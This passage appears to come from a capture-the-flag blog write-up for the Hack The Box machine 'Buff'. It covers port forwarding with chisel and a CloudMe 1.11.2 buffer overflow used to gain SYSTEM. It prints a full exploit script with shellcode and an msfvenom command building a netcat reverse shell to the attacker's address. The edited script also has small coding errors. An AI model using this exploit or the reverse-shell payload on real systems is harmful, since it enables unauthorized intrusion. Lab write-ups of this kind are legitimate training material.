-------------------------------------------------------------------------------- ---------------------------------
-CloudMe 1.11.2 - Buffer Overflow <span class="o">(</span>PoC<span class="o">)</span>                                         <span class="p">|</span> windows/remote/48389.py
-CloudMe 1.11.2 - Buffer Overflow <span class="o">(</span>SEH_DEP_ASLR<span class="o">)</span>                                <span class="p">|</span> windows/local/48499.txt
-CloudMe 1.11.2 - Buffer Overflow ROP <span class="o">(</span>DEP_ASLR<span class="o">)</span>                                <span class="p">|</span> windows/local/48840.py
-Cloudme 1.9 - Buffer Overflow <span class="o">(</span>DEP<span class="o">)</span> <span class="o">(</span>Metasploit<span class="o">)</span>                               <span class="p">|</span> windows_x86-64/remote/45197.rb
-CloudMe Sync 1.10.9 - Buffer Overflow <span class="o">(</span>SEH<span class="o">)(</span>DEP Bypass<span class="o">)</span>                        <span class="p">|</span> windows_x86-64/local/45159.py
-CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow <span class="o">(</span>Metasploit<span class="o">)</span>                 <span class="p">|</span> windows/remote/44175.rb
-CloudMe Sync 1.11.0 - Local Buffer Overflow                                    <span class="p">|</span> windows/local/44470.py
-CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                                <span class="p">|</span> windows/remote/46218.py
-CloudMe Sync 1.11.2 Buffer Overflow - WoW64 <span class="o">(</span>DEP Bypass<span class="o">)</span>                       <span class="p">|</span> windows_x86-64/remote/46250.py
-CloudMe Sync &lt; 1.11.0 - Buffer Overflow                                        <span class="p">|</span> windows/remote/44027.py
-CloudMe Sync &lt; 1.11.0 - Buffer Overflow <span class="o">(</span>SEH<span class="o">)</span> <span class="o">(</span>DEP Bypass<span class="o">)</span>                     <span class="p">|</span> windows_x86-64/remote/44784.py
-------------------------------------------------------------------------------- ---------------------------------
-</code></pre></div><h4 id="tunneling">Tunneling</h4>
-<p>The CloudMe program is currently listening on localhost (bound), so to interact with it, I&rsquo;ll have to setup a tunnel/port forwarding. For this, I&rsquo;ll use <code>chisel</code> (<a href="https://github.com/jpillora/chisel/releases)">https://github.com/jpillora/chisel/releases)</a>.</p>
-<blockquote>
-<p>Example usage of chisel is explained better in this blog :</p>
-<ul>
-<li><a href="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html#chisel">https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html#chisel</a></li>
-</ul>
-</blockquote>
-<p>First, I&rsquo;ll transfer the Windows version of chisel to Buff via PowerShell.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\U</span>sers<span class="se">\s</span>haun<span class="se">\D</span>ownload&gt; powershell.exe <span class="s2">&#34;invoke-webrequest -uri http://10.10.14.18/chisel.exe -outfile cs.exe&#34;</span>
-</code></pre></div><p>Second, I&rsquo;ll setup a chisel server on my Kali.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «buff» «10.10.14.18»
-$ chisel server -p <span class="m">9002</span>
-2020/08/14 13:22:18 server: Fingerprint 35:fe:d3:dd:6c:b3:63:35:87:6a:f2:70:52:f1:82:e2
-2020/08/14 13:22:18 server: Listening on 0.0.0.0:9002...
-</code></pre></div><p>On Buff, I&rsquo;ll connect as client to my chisel server on Kali.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\U</span>sers<span class="se">\s</span>haun<span class="se">\D</span>ownload&gt; .<span class="se">\c</span>s.exe client 10.10.14.18:9002 R:8888:127.0.0.1:8888
-</code></pre></div><p><img src="imgs/image-20210502162654346.png" alt="image-20210502162654346" style="zoom:67%;" /></p>
-<p>This, will forward the traffics that sent from my Kali Linux on port 8888 to Buff&rsquo;s localhost on port 8888.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">Kali localhost:8888 &lt;-&gt; (Kali 10.10.14.18:9002 &lt;-&gt; Buff:10.10.10.198:XXX) &lt;-&gt; Buff localhost:8888
-</code></pre></div><h4 id="exploitation-cloudme-1112">Exploitation CloudMe 1.11.2</h4>
-<p>I&rsquo;ll use this exploit PoC (I&rsquo;ve renamed it to <code>bofexploit.py</code>) but I&rsquo;ll have to modify the payload with my own.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1"># Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)</span>
-<span class="c1"># Date: 2020-04-27</span>
-<span class="c1"># Exploit Author: Andy Bowden</span>
-<span class="c1"># Vendor Homepage: https://www.cloudme.com/en</span>
-<span class="c1"># Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe</span>
-<span class="c1"># Version: CloudMe 1.11.2</span>
-<span class="c1"># Tested on: Windows 10 x86</span>
-
-<span class="c1">#Instructions:</span>
-<span class="c1"># Start the CloudMe service and run the script.</span>
-
-<span class="kn">import</span> <span class="nn">socket</span>
-
-<span class="n">target</span> <span class="o">=</span> <span class="s2">&#34;127.0.0.1&#34;</span>
-
-<span class="n">padding1</span>   <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">1052</span>
-<span class="n">EIP</span>        <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xB5\x42\xA8\x68</span><span class="s2">&#34;</span> <span class="c1"># 0x68A842B5 -&gt; PUSH ESP, RET</span>
-<span class="n">NOPS</span>       <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">30</span>
-
-<span class="c1">#msfvenom -a x86 -p windows/exec CMD=calc.exe -b &#39;\x00\x0A\x0D&#39; -f python</span>
-<span class="n">payload</span>    <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xba\xad\x1e\x7c\x02\xdb\xcf\xd9\x74\x24\xf4\x5e\x33</span><span class="s2">&#34;</span>
-<span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xc9\xb1\x31\x83\xc6\x04\x31\x56\x0f\x03\x56\xa2\xfc</span><span class="s2">&#34;</span>
-<span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x89\xfe\x54\x82\x72\xff\xa4\xe3\xfb\x1a\x95\x23\x9f</span><span class="s2">&#34;</span>
-<span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x6f\x85\x93\xeb\x22\x29\x5f\xb9\xd6\xba\x2d\x16\xd8</span><span class="s2">&#34;</span>
-<span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x0b\x9b\x40\xd7\x8c\xb0\xb1\x76\x0e\xcb\xe5\x58\x2f</span><span class="s2">&#34;</span>
-<span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x04\xf8\x99\x68\x79\xf1\xc8\x21\xf5\xa4\xfc\x46\x43</span><span class="s2">&#34;</span>
-<span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x75\x76\x14\x45\xfd\x6b\xec\x64\x2c\x3a\x67\x3f\xee</span><span class="s2">&#34;</span>
-<span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xbc\xa4\x4b\xa7\xa6\xa9\x76\x71\x5c\x19\x0c\x80\xb4</span><span class="s2">&#34;</span>
-<span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x50\xed\x2f\xf9\x5d\x1c\x31\x3d\x59\xff\x44\x37\x9a</span><span class="s2">&#34;</span>
-<span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x82\x5e\x8c\xe1\x58\xea\x17\x41\x2a\x4c\xfc\x70\xff</span><span class="s2">&#34;</span>
-<span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x0b\x77\x7e\xb4\x58\xdf\x62\x4b\x8c\x6b\x9e\xc0\x33</span><span class="s2">&#34;</span>
-<span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xbc\x17\x92\x17\x18\x7c\x40\x39\x39\xd8\x27\x46\x59</span><span class="s2">&#34;</span>
-<span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x83\x98\xe2\x11\x29\xcc\x9e\x7b\x27\x13\x2c\x06\x05</span><span class="s2">&#34;</span>
-<span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x13\x2e\x09\x39\x7c\x1f\x82\xd6\xfb\xa0\x41\x93\xf4</span><span class="s2">&#34;</span>
-<span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xea\xc8\xb5\x9c\xb2\x98\x84\xc0\x44\x77\xca\xfc\xc6</span><span class="s2">&#34;</span>
-<span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x72\xb2\xfa\xd7\xf6\xb7\x47\x50\xea\xc5\xd8\x35\x0c</span><span class="s2">&#34;</span>
-<span class="n">payload</span>   <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x7a\xd8\x1f\x6f\x1d\x4a\xc3\x5e\xb8\xea\x66\x9f</span><span class="s2">&#34;</span>
-
-<span class="n">overrun</span>    <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;C&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1500</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">padding1</span> <span class="o">+</span> <span class="n">NOPS</span> <span class="o">+</span> <span class="n">EIP</span> <span class="o">+</span> <span class="n">payload</span><span class="p">))</span>
-
-<span class="n">buf</span> <span class="o">=</span> <span class="n">padding1</span> <span class="o">+</span> <span class="n">EIP</span> <span class="o">+</span> <span class="n">NOPS</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">overrun</span>
-
-<span class="k">try</span><span class="p">:</span>
-        <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
-        <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span><span class="mi">8888</span><span class="p">))</span>
-        <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
-<span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-        <span class="nb">print</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_value</span><span class="p">)</span>
-</code></pre></div><p>To generate new payload, I&rsquo;ll follow the instruction on the PoC code which is using <code>msfvenom</code>. But, instead of running <code>calc.exe</code>, I&rsquo;ll change it to execute the netcat I&rsquo;ve uploaded before during upgrading the <code>shaun</code> shell.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «buff» «10.10.14.18»
-$ msfvenom -p windows/exec <span class="nv">CMD</span><span class="o">=</span><span class="s1">&#39;C:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe 10.10.14.18 9005&#39;</span> -b <span class="s1">&#39;\x00\x0A\x0D&#39;</span> -f python -v payload
-
-...&lt;SNIP&gt;...
-<span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xbe\xd0\xe7\xa9\x73\xd9\xc7\xd9\x74\x24\xf4\x5f&#34;</span>
-<span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x31\xc9\xb1\x3e\x31\x77\x12\x03\x77\x12\x83\x17&#34;</span>
-<span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xe3\x4b\x86\x6b\x04\x09\x69\x93\xd5\x6e\xe3\x76&#34;</span>
-<span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xe4\xae\x97\xf3\x57\x1f\xd3\x51\x54\xd4\xb1\x41&#34;</span>
-<span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xef\x98\x1d\x66\x58\x16\x78\x49\x59\x0b\xb8\xc8&#34;</span>
-<span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xd9\x56\xed\x2a\xe3\x98\xe0\x2b\x24\xc4\x09\x79&#34;</span>
-<span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xfd\x82\xbc\x6d\x8a\xdf\x7c\x06\xc0\xce\x04\xfb&#34;</span>
-<span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x91\xf1\x25\xaa\xaa\xab\xe5\x4d\x7e\xc0\xaf\x55&#34;</span>
-<span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x63\xed\x66\xee\x57\x99\x78\x26\xa6\x62\xd6\x07&#34;</span>
-<span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x06\x91\x26\x40\xa1\x4a\x5d\xb8\xd1\xf7\x66\x7f&#34;</span>
-<span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xab\x23\xe2\x9b\x0b\xa7\x54\x47\xad\x64\x02\x0c&#34;</span>
-<span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xa1\xc1\x40\x4a\xa6\xd4\x85\xe1\xd2\x5d\x28\x25&#34;</span>
-<span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x53\x25\x0f\xe1\x3f\xfd\x2e\xb0\xe5\x50\x4e\xa2&#34;</span>
-<span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x45\x0c\xea\xa9\x68\x59\x87\xf0\xe6\x9c\x15\x8f&#34;</span>
-<span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x45\x9e\x25\x8f\xf9\xf7\x14\x04\x96\x80\xa8\xcf&#34;</span>
-<span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xd2\x7f\xe3\x4d\x72\xe8\xaa\x04\xc6\x75\x4d\xf3&#34;</span>
-<span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x05\x80\xce\xf1\xf5\x77\xce\x70\xf3\x3c\x48\x69&#34;</span>
-<span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x89\x2d\x3d\x8d\x3e\x4d\x14\xce\xfa\xed\xe2\xa3&#34;</span>
-<span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x9f\x7f\x7e\x1f\x13\xe8\xe1\xea\xbd\xb4\x85\x7b&#34;</span>
-<span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x35\x2b\x2a\xec\xd8\xd7\xc1\xae\x74\x7b\x08\x2b&#34;</span>
-<span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xf1\x1e\x74\x9e\x64\xc1\x17\x8d\x02\x2f\xbd\x35&#34;</span>
-<span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xae\x0f\x0c\xf5\x1e\x61\x5e\xdb\x6f\xb5\xb0\x16&#34;</span>
-<span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xa4\x95\xf5\x68\xf4\xe0\x05&#34;</span>
-</code></pre></div><p>After removed the comments and changed the payload, the <code>bofexploit.py</code> now look like this:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">socket</span>
-
-<span class="n">target</span> <span class="o">=</span> <span class="s2">&#34;127.0.0.1&#34;</span>
-<span class="n">padding1</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">1052</span>
-<span class="n">EIP</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xB5\x42\xA8\x68</span><span class="s2">&#34;</span> <span class="c1"># 0x68A842B5 -&gt; PUSH ESP, RET</span>
-<span class="n">NOPS</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">30</span>
-
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xbe\xd0\xe7\xa9\x73\xd9\xc7\xd9\x74\x24\xf4\x5f</span><span class="s2">&#34;</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x31\xc9\xb1\x3e\x31\x77\x12\x03\x77\x12\x83\x17</span><span class="s2">&#34;</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xe3\x4b\x86\x6b\x04\x09\x69\x93\xd5\x6e\xe3\x76</span><span class="s2">&#34;</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xe4\xae\x97\xf3\x57\x1f\xd3\x51\x54\xd4\xb1\x41</span><span class="s2">&#34;</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xef\x98\x1d\x66\x58\x16\x78\x49\x59\x0b\xb8\xc8</span><span class="s2">&#34;</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xd9\x56\xed\x2a\xe3\x98\xe0\x2b\x24\xc4\x09\x79</span><span class="s2">&#34;</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xfd\x82\xbc\x6d\x8a\xdf\x7c\x06\xc0\xce\x04\xfb</span><span class="s2">&#34;</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x91\xf1\x25\xaa\xaa\xab\xe5\x4d\x7e\xc0\xaf\x55</span><span class="s2">&#34;</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x63\xed\x66\xee\x57\x99\x78\x26\xa6\x62\xd6\x07</span><span class="s2">&#34;</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x06\x91\x26\x40\xa1\x4a\x5d\xb8\xd1\xf7\x66\x7f</span><span class="s2">&#34;</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xab\x23\xe2\x9b\x0b\xa7\x54\x47\xad\x64\x02\x0c</span><span class="s2">&#34;</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xa1\xc1\x40\x4a\xa6\xd4\x85\xe1\xd2\x5d\x28\x25</span><span class="s2">&#34;</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x53\x25\x0f\xe1\x3f\xfd\x2e\xb0\xe5\x50\x4e\xa2</span><span class="s2">&#34;</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x45\x0c\xea\xa9\x68\x59\x87\xf0\xe6\x9c\x15\x8f</span><span class="s2">&#34;</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x45\x9e\x25\x8f\xf9\xf7\x14\x04\x96\x80\xa8\xcf</span><span class="s2">&#34;</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xd2\x7f\xe3\x4d\x72\xe8\xaa\x04\xc6\x75\x4d\xf3</span><span class="s2">&#34;</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x05\x80\xce\xf1\xf5\x77\xce\x70\xf3\x3c\x48\x69</span><span class="s2">&#34;</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x89\x2d\x3d\x8d\x3e\x4d\x14\xce\xfa\xed\xe2\xa3</span><span class="s2">&#34;</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x9f\x7f\x7e\x1f\x13\xe8\xe1\xea\xbd\xb4\x85\x7b</span><span class="s2">&#34;</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x35\x2b\x2a\xec\xd8\xd7\xc1\xae\x74\x7b\x08\x2b</span><span class="s2">&#34;</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xf1\x1e\x74\x9e\x64\xc1\x17\x8d\x02\x2f\xbd\x35</span><span class="s2">&#34;</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xae\x0f\x0c\xf5\x1e\x61\x5e\xdb\x6f\xb5\xb0\x16</span><span class="s2">&#34;</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xa4\x95\xf5\x68\xf4\xe0\x05</span><span class="s2">&#34;</span>
-
-<span class="n">overrun</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;C&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1500</span> <span class="err">—</span> <span class="nb">len</span><span class="p">(</span><span class="n">padding1</span> <span class="o">+</span> <span class="n">NOPS</span> <span class="o">+</span> <span class="n">EIP</span> <span class="o">+</span> <span class="n">payload</span><span class="p">))</span>
-<span class="n">buf</span> <span class="o">=</span> <span class="n">padding1</span> <span class="o">+</span> <span class="n">EIP</span> <span class="o">+</span> <span class="n">NOPS</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">overrun</span>
-
-<span class="k">try</span><span class="p">:</span>
- <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
- <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span><span class="mi">8888</span><span class="p">))</span>
- <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
-<span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
- <span class="nb">print</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_value</span><span class="p">)</span>
-</code></pre></div><p>The exploit is ready, and now I’ll setup a listener on the same port with the one I’ve assigned to the payload and run the exploit afterwards.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «buff» «10.10.14.18»
-$ python2 bofexploit.py
-</code></pre></div><p>On my listener:</p>
-<p><img src="imgs/image-20210502164625103.png" alt="image-20210502164625103" style="zoom:67%;" /></p>
-<p>Now I can grab the root flag or dump the hashes.</p>
-<hr>
-<h2 id="references">References</h2>
-<ul>
-<li><a href="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html">https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html</a></li>
-<li><a href="https://bufferoverflows.net/practical-exploitation-part-1-cloudme-sync-1-11-2-bufferoverflow-seh/">https://bufferoverflows.net/practical-exploitation-part-1-cloudme-sync-1-11-2-bufferoverflow-seh/</a></li>
 </ul>
 ]]></content:encoded>
     </item>
